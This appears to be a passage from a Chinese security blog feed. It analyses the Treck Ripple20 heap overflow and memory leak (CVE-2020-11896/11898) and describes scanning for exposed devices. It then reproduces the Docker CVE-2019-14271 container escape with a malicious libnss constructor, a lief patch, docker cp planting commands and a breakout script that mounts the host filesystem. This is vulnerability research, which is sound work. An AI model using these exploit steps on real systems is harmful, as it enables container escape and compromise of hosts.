/></a><p>在此的示例中，当IPv4层接收到数据包(在函数tfIpIncomingPacket中)时，指针pktuLinkDataPtr已经指向以太网头，因此可以安全地假设pktuLinkDataPtr指向的数据是IPv4头。<br>传入的数据由具有相同命名约定TF<em>IncomingPacket的函数处理(正如我们已经看到的)，其中</em>是协议名称。在以太网/IPv4/ICMP的情况下，包将由函数tfEtherRecv、tfIpIncomingPacket处理。<br>和tfIcmpIncomingPacket。<br>Treck堆栈处理从tfIpIncomingPacket调用的过程tfIpReAssemblePacket中的片段重组。每当接收到发往设备的IP片段时，都会调用此过程。如果缺少片段，则函数返回NULL。否则，如果所有片段都到达并且没有漏洞，则网络堆栈使用pktuLinkNextPtr字段将片段链接在一起，并传递数据包以供下一层进一步处理。在此上下文中的单词“重组”并不意味着将分组复制到连续的存储块，而是简单地将它们链接在一个链表中。</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>为了了解漏洞的根本原因，我们将快速查看IP标头中的两个字段：</p><p><em>•</em> IHL （4个比特）：该尺寸的所述IP 报头中的双字。最低值是5 （20 个字节）。如果有IP选项，头长度变大，最多值的0xf（60个字节）。  </p><p><em>•</em> 总长度（2个字节）：整个IP数据包的大小，以字节（或IP片段，如果是分段的）为单位，包括报头。  </p><p>函数tfIpIncomingPacket 从一些基本的健全性检查开始。除了验证标头校验和之外，它还验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip_version &#x3D;&#x3D; 4 &amp;&amp; data_available &gt;&#x3D; 21 &amp;&amp; header_length &gt;&#x3D; 20 &amp;&amp; total_length &gt; header_length &amp;&amp; total_length &lt;&#x3D; data_available</span><br></pre></td></tr></table></figure><p>“可用数据”是使用字段pktuChainDataLength测量的。<br>如果所有健全性检查都通过，该函数将检查IP报头中指定的总长度是否严格小于数据包的pktuChainDataLength，表明实际接收的数据多于IP报头中所述的数据。如果为真，则执行修剪操作以删除额外数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((uint)ipTotalLength &lt;= pkt-&gt;pktuChainDataLength) &#123; <span class="keyword">if</span> ((uint)ipTotalLength != pkt-&gt;pktuChainDataLength) &#123;</span><br><span class="line">pkt-&gt;pktuChainDataLength = (uint)ipTotalLength; </span><br><span class="line">pkt-&gt;pktuLinkDataLength = (uint)ipTotalLength;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是漏洞所在。回想一下，pktuLinkDataLength保存当前片段的大小，pktuChainDataLength保存整个数据包的大小。如果执行上述操作，则会创建不一致，其中pkt-&gt;pktuChainDataLength。<br>==pkt-&gt;pktuLinkDataLength，但可能有其他片段指向。<br>pkt-&gt;pktuLinkNextPtr.。另一种方式是将其视为一种虚构的不一致状态，其中链表上片段的总大小大于pktuChainDataLength中存储的大小。<br>由弱修剪操作产生的不一致对于处理的其余部分来说不是好兆头。然而，我们还有另一个挑战需要克服。每次使用一个接收到的片段调用tfIpIncomingPacket函数，并调用tfIpReAssemblePacket来处理它。tfIpReAssemblePacket负责将片段插入到上述链表中。它不会将片段复制到连续的内存缓冲区。收到所有片段后，tfIpReAssemblePacket以片段链接列表的形式返回完整的数据包，以便在下一个协议层进行进一步处理。该重组操作在易受攻击的修剪操作之后执行。一旦可靠的操作完成，tfIpIncomingPacket将返回或转发数据包，以便在下一网络层(例如：UDP)进行处理。这会阻止我们执行利用漏洞攻击，因为我们需要分段的数据包才能达到不一致的状态。换句话说，易受攻击的代码应该只在每个片段的基础上执行(或在单个片段的数据包上执行)。如果以这种方式执行，它实际上并不容易受到攻击。<br>那么，我们如何才能用传入的碎片数据触发易受攻击的修剪流，从而实现上述不一致呢？</p><h4 id="在IP层处理分段数据包"><a href="#在IP层处理分段数据包" class="headerlink" title="在IP层处理分段数据包"></a>在IP层处理分段数据包</h4><p>为了使分段的数据包在IP层得到处理并到达易受攻击的流，我们使用隧道。<br>隧道允许tfIpIncomingPacket将内部IP数据包作为非分段数据包进行处理。函数tfIpIncomingPacket将被递归调用两次，一次用于IP隧道的内层，多次用于外层(每个片段一次)。首先，tfIpIncomingPacket将接收来自外层的所有片段，在每个片段上调用tfIpReAssemblePacket，一旦它们都被接收，它将把执行传递到下一个协议层，在本例中再次是IPv4，因此将从具有内部IP层的tfIpIncomingPacket调用tfIpIncomingPacket。</p><p><a href="https://lh5.googleusercontent.com/xX_OIWoDTddPFXkKXpjKXd5tROmOlFf7V-xipWAHODKoI1Ke_dk23YSytZYHTHZ50I67C4hCKqbHbQzaGBKXi5u24BTDy_ulnsLTbgHyKxXtKB0UfS8Yec-Jz01QcISgvik_I5Y" title="img" class="gallery-item"><img src="https://lh5.googleusercontent.com/xX_OIWoDTddPFXkKXpjKXd5tROmOlFf7V-xipWAHODKoI1Ke_dk23YSytZYHTHZ50I67C4hCKqbHbQzaGBKXi5u24BTDy_ulnsLTbgHyKxXtKB0UfS8Yec-Jz01QcISgvik_I5Y" alt="img"></a></p><p>对外部IP分组进行分段会导致使用内部分组调用tfIpIncomingPacket，该内部分组现在由几个分段组成，但在IP报头中标记为未分段(MF=0)。就描述数据包的数据结构而言，它现在由链接列表中的几个单独的链接组成，每个链接都有一个单独的pktuLinkDataLength值。</p><p>让我们说得更具体些。请考虑下面的示例，它将伴随我们完成本文：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630192657.png" title="image-20200630192655708" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630192657.png" alt="image-20200630192655708"></a></p><p>(我们将 checksum 字段设置为0，因为这将导致跳过UDP校验和验证。)。<br>当网络堆栈处理外部片段时，它使用字段将它们链接起来。<br>如前所述，tsUserPacket结构中的pktuLinkNextPtr。当函数tfIpIncomingPacket处理内部IP包(由于协议=4)时，它正在处理传入的分片数据(内部IP包由两个链接在一起的tsPacket结构表示)，但仍会调用易受攻击的流，从而解决了我们的挑战。<br>此外，内部IP分组通过IP报头健全性检查，因为只考虑tsUserPacket的pktuChainDataLength字段(而不是pktuLinkDataLength)。在我们的示例中，内部IP数据包(32)的总长度较小。<br>超过链数据长度(1000+8+20=1028)，因此Treck堆栈将通过将字段pktuLinkDataLength和pktuChainDataLength设置为相同的值-总IP长度(在我们的示例中为32)，来尝试不正确地修剪数据包。这导致内部IP分组由链接在一起的两个tsPacket结构表示，但是它们的总CUSIZE大于pktuChainDataLength字段(pktuChainDataLength字段在修整后等于32，而不是1028字节)。</p><p><a href="https://lh3.googleusercontent.com/1AvUvDvuhRYsbIROhXpYD1sVtZA7VL1PV5I11ZHdDiIBT2-K2PpJfq4ousnjqaHhyr7DeSL-dhpQnA1b1SvBsYCjkeTTuCAhT-b5k65-71DlHm-RxGUSaoeeMnZXQdkbnk3mrU8" title="img" class="gallery-item"><img src="https://lh3.googleusercontent.com/1AvUvDvuhRYsbIROhXpYD1sVtZA7VL1PV5I11ZHdDiIBT2-K2PpJfq4ousnjqaHhyr7DeSL-dhpQnA1b1SvBsYCjkeTTuCAhT-b5k65-71DlHm-RxGUSaoeeMnZXQdkbnk3mrU8" alt="img"></a></p><h4 id="利用UDP实现堆溢出"><a href="#利用UDP实现堆溢出" class="headerlink" title="利用UDP实现堆溢出"></a>利用UDP实现堆溢出</h4><p>既然我们已经达到了不一致的状态，我们就面临着另一个问题–我们如何利用这种不一致来获得内存损坏原语？<br>原来，至少有一条代码路径将碎片数据复制到单个连续缓冲区中。这是处理UDP数据报的代码的一部分。该流的内部逻辑由正在分配的新分组(使用tfGetSharedBuffer)组成，其大小基于pktuChainDataLength字段，随后是分组的不同片段的副本逐个进入新分配的分组。<br>负责执行复制的函数是tfCopyPacket，它按顺序接受源包和目的包。以下是片段复制代码的摘录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(dst-&gt;pktuLinkDataPtr + i,src-&gt;pktuLinkDataPtr,src-&gt;pktuLinkDataLength); i = i + src-&gt;pktuLinkDataLength;</span><br><span class="line">src = (tsPacket *)src-&gt;pktuLinkNextPtr;</span><br><span class="line">&#125; <span class="keyword">while</span> (src != <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>如您所见，函数tfCopyPacket没有考虑它写入的缓冲区的长度。它只是从src包(我们的分段包)中提取每个链接，并将其数据复制到目标包中。目标数据包是根据pktuChainDataLength分配的，因此如果之前触发了该漏洞，则在我们的无效之后，分配的缓冲区可能小于数据包中所有单个链接的总和-因此，会发生堆溢出。</p><p>还有一件事需要描述，那就是我们如何触发这一流程。</p><p>如果应用程序正在侦听任何UDP端口，则发往该端口的UDP数据包将被传递给套接字处理函数tfSocketIncomingPacket。其任务是将数据包附加到套接字接收队列(稍后由应用层轮询)。</p><p>在我们的研究中，我们发现当UDP数据包的套接字接收队列非空并且有新的数据包到达时，上述包含堆溢出的流是可以实现的。请看tfSocketIncomingPacket的以下摘录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ocal_10 = pkt;</span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"><span class="keyword">if</span> (sockEntry-&gt;socReceiveQueueNextPtr == <span class="literal">NULL</span>) &#123; sockEntry-&gt;socReceiveQueueNextPtr = pkt; queueLastPtr = local_10;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">queueLastPtr = sockEntry-&gt;socReceiveQueueLastPtr;</span><br><span class="line"><span class="keyword">if</span> ((queueLastPtr-&gt;pktSharedDataPtr-&gt;dataFlags &amp; <span class="number">0x40</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Shared data doesn&#x27;t point to user device memory */</span></span><br><span class="line">sizeOfPacketBuffer = (uint)(pkt-&gt;pktSharedDataPtr-&gt;dataBufLastPtr +</span><br><span class="line">‹→ -(<span class="keyword">int</span>)pkt-&gt;pktSharedDataPtr-&gt;dataBufFirstPtr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (protoNum == <span class="number">6</span>) &#123;</span><br><span class="line"><span class="comment">/* Related to TCP; redacted for brevity */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (sizeOfPacketBuffer != <span class="number">0</span>) &#123;</span><br><span class="line">uVar2 = (uint)sockEntry-&gt;socRecvCopyFraction * pkt-&gt;pktuChainDataLength; <span class="keyword">if</span> (uVar2 &lt;= sizeOfPacketBuffer) &#123;</span><br><span class="line">dst = tfGetSharedBuffer(<span class="number">0x54</span>,pkt-&gt;pktuChainDataLength,<span class="number">0</span>); <span class="keyword">if</span> (dst != <span class="literal">NULL</span>) &#123;</span><br><span class="line">tfCopyPacket(pkt,dst); needToDrop = <span class="literal">true</span>; local_10 = dst;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">queueLastPtr-&gt;pktChainNextPtr = local_10; queueLastPtr = local_10;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到，为了到达tfGetSharedBuffer，我们需要绕过涉及到ocRecvCopyFraction的检查。我们不知道它的确切用途，但通过调试和实验，我们发现它的值是4(在我们的情况下)。</p><p>在我们反复出现的示例中，我们的第一个数据包链路的缓冲区大小很小，因此SizzeOfPacketBuffer。<br>相对较小(大约10s字节)。<br>但是当我们到达该流时，pkt-&gt;pktuChainDataLength等于4(修剪后为32，然后在处理IP层时递减20(IP报头的大小)，然后再次递减8(UDP报头的大小))。因此，4*4=16小于sizeOfPacketBuffer，我们通过此检查。<br>我们需要确保的最后一件事是UDP数据包的接收队列是非空的(否则无法到达此流)。在理论上，有几种方法可以做到这一点。在我们的攻击中，我们发现将多个UDP数据包足够快地发送到同一端口就可以做到这一点。然而，要让这一部分可靠地工作是很棘手的。该漏洞是用Python编写的，使用的Scapy对于我们的目的来说太慢了。为了克服这个障碍，我们使用了Scapy的L3Socket对象，并实例化了一堆线程，这些线程只会用良性的UDP数据包淹没设备，因此套接字接收队列将是非空的。用C或GO编写代码可能也可以。根据要利用的设备和侦听服务器，可以对此部分进行其他改进。<br>另一个障碍是，在我们到达发生溢出的tfSocketIncomingPacket之前，易受攻击的数据包通过tfUdpIncomingPacket。此函数包含一些与UDP相关的健全性检查，因此我们还需要通过这些检查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">udpLen &#x3D; udpHdr-&gt;udpLength &gt;&gt; 8 | udpHdr-&gt;udpLength &lt;&lt; 8;</span><br><span class="line">if ((udpLen &lt; 8) || (*(ushort  *)&amp;pkt-&gt;pktuChainDataLength  &lt;  udpLen))  goto  dropPacket; if (udpLen &lt; *(ushort *)&amp;pkt-&gt;pktuChainDataLength) &#123;</span><br><span class="line">tfPacketTailTrim(pkt,(uint)udpLen,0);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* ... *&#x2F;</span><br><span class="line">if ((udpHdr-&gt;udpChecksum !&#x3D; 0) &amp;&amp; (tvUdpIncomingChecksumOn !&#x3D; 0)) &#123;</span><br><span class="line">&#x2F;* Compute checksum... *&#x2F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正如我们所看到的，通过确保UDP长度字段等于pktuChainDataLength字段减去内部IP报头的大小，我们可以避免这种类型的修剪(不要与易受攻击的流混淆)。<br>总而言之：如果我们的设备上有UDP端口在监听，我们可以快速发送数据包，这样套接字接收队列就不会为空。同时，我们将发送会触发该漏洞的零碎UDP数据包，并勾选几个复选框。我们预期的结果是使用tfGetSharedBuffer在堆上分配一个小缓冲区，然后tfCopyPacket会使其溢出。</p><h2 id="CVE-2020-11898"><a href="#CVE-2020-11898" class="headerlink" title="CVE-2020-11898"></a>CVE-2020-11898</h2><p>前面提到了，Treck TCP/IP不能正确处理IP-in-IP隧道上传入的IPv4片段。这还可能允许未经验证的攻击者从 heap 中泄漏内存。</p><p>如果 tfIcmpErrPacket 将越界数据复制到错误数据包中，则可作为信息泄漏漏洞来被利用。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630213503.png" title="image-20200630213501855" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630213503.png" alt="image-20200630213501855"></a></p><p>参考如上实例：</p><p>当网络堆栈接收到这两个片段时，它会使用tfIpReAssemblePacket重新组装它们。此函数使用tsUserPacket结构中的字段pktuLinkNextPtr链接两个片段。如果启用了隧道，则IP层接下来将在函数tfIpIncomingPacket中处理内部IP数据包。</p><p>内部IP分组通过IP报头健全性检查，因为只考虑tsUserPacket的pktuChainDataLength字段(而不是pktuLinkDataLength)。此外，由于在标准IP报头(20字节)之后有4个空字节，并且空字节表示选项列表的末尾(见<a href="https://tools.ietf.org/html/rfc791)%EF%BC%8C%E5%9B%A0%E6%AD%A4IP%E9%80%89%E9%A1%B9%E8%A7%A3%E6%9E%90%E9%80%9A%E8%BF%87%E3%80%82">https://tools.ietf.org/html/rfc791)，因此IP选项解析通过。</a></p><p>如果内部IP数据包的IP报头中的总长度字段严格小于链数据长度，则网络堆栈将尝试修剪数据包。如前文中所述，修剪是通过将字段pktuLinkDataLength和pktuChainDataLength设置为相同的值，即总长度字段(在我们的示例中为100)来实现的。</p><p>由于内部IP数据包包含无效的IPv4协议号(协议0)，因此网络堆栈将通过发送类型为3(目的地不可达)代码为2(协议不可达)的ICMP错误消息来拒绝该数据包。</p><p>负责创建错误数据包的函数是tfIcmpErrPacket。它会分配一个新数据包，初始化一些ICMP字段，并最终从违规数据包(内部IP数)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">length   =   (packetPtr-&gt;pktUserStruct).pktuLinkDataLength; <span class="keyword">if</span> (headerLengthInBytes + <span class="number">8</span> &lt;= length) &#123;</span><br><span class="line">length = headerLengthInBytes + <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(icmpErrHdrPtr + <span class="number">8</span>, pktIpHdrPtr, length);</span><br></pre></td></tr></table></figure><p>正如我们所看到的，tfIcmpErrPacket通过取IP报头长度(以字节为单位)加8(在我们的示例中，60+8=68)和pktuLinkDataLength字段(在本例中修剪为100)之间的最小值来计算要复制的字节数。由于违规数据包的第一个片段的实际链接数据长度为24(不是100)，tfIcmpErrPacket将复制68−24=44字节从堆中泄漏的数据。</p><p>此漏洞可用于在启用漏洞缓解(如ASLR)时，以及在没有调试器的情况下，利用CVE2020-11896和其他RCE漏洞进行攻击。</p><p>2020-7-2 更新</p><p>试了下文章写的 poc 发现并没有任何返回，但是机器直接打崩了。等个可以调试的设备。</p><h2 id="关于-treck-协议栈扫描"><a href="#关于-treck-协议栈扫描" class="headerlink" title="关于 treck 协议栈扫描"></a>关于 treck 协议栈扫描</h2><p>看到 启明星辰 ADLAB 的公众号提到了 Treck协议栈自定义了类型为165(0xa5)的ICMP包，并一旦收到165的ICMP包会回复类型为166的ICMP包响应。<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630215750.webp" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630215750.webp" alt="img"></a></p><p>由于手头没有相应的设备，以及查下公司的打印机相关设备，似乎都没有在官方公告的影响范围内，所以用这个方法跑了下，就到目前写这篇文章为止了，大概跑了1000多个 IP ，没有任何返回，目前猜测，公网 scan 的 话可能会被网关给 drop 掉。</p><p>2020-7-2 更新：</p><p>昨天发现上海公司有一台设备，测试的时候发现 scapy 写的扫描是有问题的，scapy 本身似乎对包进行了判断，导致拿不到回包，所以 github 上公开的扫描应该是不行，另外一点 ttl 如果太小似乎也会被drop掉(在多层路由的情况下)</p><p>这里贴一下我用 socket 写的脚本</p><p>设置 ICMP_ECHO_REQUEST 为0xa5 ，然后再收包判断 type</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702112743.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702112743.png"></a></p><p>例：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702214200.png" title="image-20200702113751286" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702214200.png" alt="image-20200702113751286"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf">https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf</a></p><p><a href="https://mp.weixin.qq.com/s/2F1-35HIk126crowAh9LLw">https://mp.weixin.qq.com/s/2F1-35HIk126crowAh9LLw</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-11896 </tag>
            
            <tag> CVE-2020-11898 </tag>
            
            <tag> Treck </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-14271 docker escape</title>
      <link href="CVE-2019-14271-docker-escape.html"/>
      <url>CVE-2019-14271-docker-escape.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<blockquote><p><a href="https://github.com/moby/moby/pull/39612">https://github.com/moby/moby/pull/39612</a></p></blockquote><h2 id="github-issue："><a href="#github-issue：" class="headerlink" title="github issue："></a>github issue：</h2><p>Initialize nss libraries in Glibc so that the dynamic libraries are loaded in the host environment not in the chroot from untrusted files.</p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14271">CVE-2019-14271</a> may allow unprivileged access to host system while copying files from a malicious container image with <code>docker cp</code> command.</p><p><strong>Affected versions</strong>: v19.03.0. Older Docker versions are not affected by this issue.</p><p>This fix is included in the already released <a href="https://github.com/docker/docker-ce/releases/v19.03.1">Docker v19.03.1</a>. Users of Docker v19.03.0 are advised to upgrade.</p><p>The patch was previously reviewed internally by maintainers under GitHub security advisory.If you find security issues in Moby, please follow responsible disclosure guidelines by sending an email to <a href="mailto:security@docker.com">security@docker.com</a>.</p><p>yum list docker-ce –showduplicates|sort –r</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这两天和 @explorer 一起看了下这个洞，以及好久没更博客了，随手写个文章记录下：</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞成因是由于，<code>docker cp</code>  进行拷贝的时候，将 <code>docker-tar</code> 此进程先 chroot 到容器内，然而此时使用的 so 文件也是容器内的，而 <code>docker-tar</code> 进程本身没有容器化，意味着仍然拥有高权限，所以此时如果容器内的 so 被恶意篡改，那么可能造成 docker 容器逃逸 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp cve-2019-14271:/lib ./lib &amp; <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> ps -auxf |grep -v grep|grep docker-tar|tr -s <span class="string">&#x27; &#x27;</span>|cut -d <span class="string">&#x27; &#x27;</span> -f 2|xargs -I&#123;&#125; ls -al /proc/&#123;&#125;/root ; <span class="keyword">done</span> |  uniq</span><br></pre></td></tr></table></figure><p>通过上述命令可以清晰的看到 chroot 过程</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183320.png" title="chroot" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183320.png" alt="chroot"></a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>安装 apt 依赖包，用于通过HTTPS来获取仓库: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p>添加 Docker 的官方 GPG 密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>使用以下指令设置稳定版仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">  stable&quot;</span></span><br></pre></td></tr></table></figure><p>列出 <code>docker-ce</code> 的所有版本 </p><p><code>apt-cache madison docker-ce</code></p><p>安装有漏洞的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce=5:19.03.0~3-0~ubuntu-bionic docker-ce-cli=5:19.03.0~3-0~ubuntu-bionic containerd.io</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>由于是 <code>docker-cp</code> 这个进程出现的问题，其本身用到了 <code>libnsss_*.so*</code> 的一些库，所以我们选择对其进程 so 劫持</p><p>劫持代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __attribute__((constructor)) back() </span><br><span class="line">&#123;     </span><br><span class="line"> FILE *proc_file = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>,<span class="string">&quot;r&quot;</span>);   </span><br><span class="line"> <span class="keyword">if</span> (proc_file !=<span class="literal">NULL</span>)    &#123;   </span><br><span class="line">                fclose(proc_file);       </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;        </span><br><span class="line">system(<span class="string">&quot;/breakout&quot;</span>);        </span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于程序在执行的时候，有chroot 过程，避免其他进程也使用了这些库，所以先判断 <code>/proc/self/exe</code> 是否可读，如果可读则不是我们的目标进程</p><p>另外这里用到了 <code>constructor</code> 魔术方法，之前在 geekpwn maxhub 利用的时候也提到了，这里不再赘述。</p><p>patch <code>libss_files-2.27.so</code> 代码, 这里使用 lief 进行 patch</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lief.parse(<span class="string">&quot;./libnss_files-2.27.so&quot;</span>)</span><br><span class="line">&lt;lief.ELF.Binary object at <span class="number">0x7f749704f030</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a= lief.parse(<span class="string">&quot;./libnss_files-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.add_library(<span class="string">&quot;/tmp/a.out&quot;</span>)</span><br><span class="line">&lt;lief.ELF.DynamicEntryLibrary object at <span class="number">0x7f74963d9ae8</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.write(<span class="string">&quot;libnss_files-2.27.so.patch&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后将上面的 c 代码进行编译</p><p><code>gcc -shared -fPIC backdoor.c</code></p><p>首先，创建一个容器作为攻击目标</p><p><code>docker run --rm -it --name cve-2019-14271 ubuntu:18.04 /bin/bash</code></p><p>然后将修改后的 so 和利用的脚本放入容器内：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp a.out cve-2019-14271:/tmp </span><br><span class="line">docker cp breakout cve-2019-14271:/ </span><br><span class="line">docker cp libnss_files.so.2_patch cve-2019-14271:/lib/x86_64-linux-gnu/libnss_files-2.27.so</span><br></pre></td></tr></table></figure><p>此时 breakout的内容为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir /host_fs</span><br><span class="line">mount -t proc none /proc</span><br><span class="line"><span class="built_in">cd</span> /proc/1/root</span><br><span class="line">mount --<span class="built_in">bind</span> . /host_fs</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hack by chaitin&quot;</span> &gt; /proc/1/root/tmp/hack</span><br></pre></td></tr></table></figure><p>则意味着，攻击成功有两个标志：</p><p>1、容器内的 /host_fs 